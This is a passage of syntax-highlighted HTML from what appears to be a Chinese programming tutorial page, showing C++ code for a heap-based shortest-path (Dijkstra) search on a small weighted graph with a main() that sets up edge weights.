class=\"crayon-v\">node_info</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">min_heap</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-68\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">min_heap</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">push</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">node_info</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 将起始结点入队</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-69\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-70\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-71\"><span class=\"crayon-h\">            </span><span class=\"crayon-e\">node_info </span><span class=\"crayon-v\">top</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">min_heap</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">top</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 取出最大值</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-72\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">min_heap</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">pop</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-73\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-74\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">// 已到达目的结点</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-75\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">top</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">index</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">end_node</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-76\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">break</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-77\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-78\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">// 未到达则遍历</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-79\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">node_count</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">++</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-80\"><span class=\"crayon-h\">                </span><span class=\"crayon-c\">// 顶点top.index和i间有边，且此路径长小于原先从原点到i的路径长 </span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-81\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">top</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">no_edge</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-82\"><span class=\"crayon-h\">                    </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">top</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">weight</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">top</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">path</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">weight</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-83\"><span class=\"crayon-h\">                    </span><span class=\"crayon-v\">min_heap</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">push</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">node_info</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">top</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">weight</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">top</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-84\"><span class=\"crayon-h\">                    </span><span class=\"crayon-v\">path</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">front_index</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">top</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-85\"><span class=\"crayon-h\">                    </span><span class=\"crayon-v\">path</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">weight</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">top</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">weight</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">top</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-86\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-87\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-88\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">min_heap</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">empty</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-89\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">break</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-90\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-91\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-92\"> </div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-93\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">shortest_path</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">path</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">end_node</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">weight</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-94\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">index</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">end_node</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-95\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">s_path_index</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">push_back</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-96\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-97\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">index</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">path</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">front</span><span class=\"crayon-sy\">_</span>index<span class=\"crayon-h\"> </span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-98\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">s_path_index</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">push_back</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-99\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">index</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-100\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">break</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-101\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-102\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-103\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-104\"> </div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-105\"><span class=\"crayon-m\">private</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-106\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">vector</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">vector</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">int</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\">    </span><span class=\"crayon-i\">graph</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">            </span><span class=\"crayon-c\">// 图的数组表示</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-107\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\">                        </span><span class=\"crayon-v\">node_count</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 结点个数</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-108\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\">                </span><span class=\"crayon-v\">no_edge</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 无通路</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-109\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\">                </span><span class=\"crayon-v\">end_node</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 目的结点</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-110\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">vector</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">int</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\">                </span><span class=\"crayon-v\">s_path_index</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 最短路径</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-111\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\">                        </span><span class=\"crayon-v\">shortest_path</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 最短路径</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-112\"><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-113\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-114\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-115\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-116\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">11</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-117\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">vector</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">vector</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">int</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">graph</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-118\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">++</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-119\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">resize</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-120\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-121\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">++</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-122\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">++</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-123\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-124\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-125\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-126\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-127\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-128\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-129\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-130\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-131\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-132\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-133\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-134\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-135\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">7</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-136\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-137\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230fb5a832870000265-138\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b6230fb5a832870000265-139\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">graph</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">]</span><span 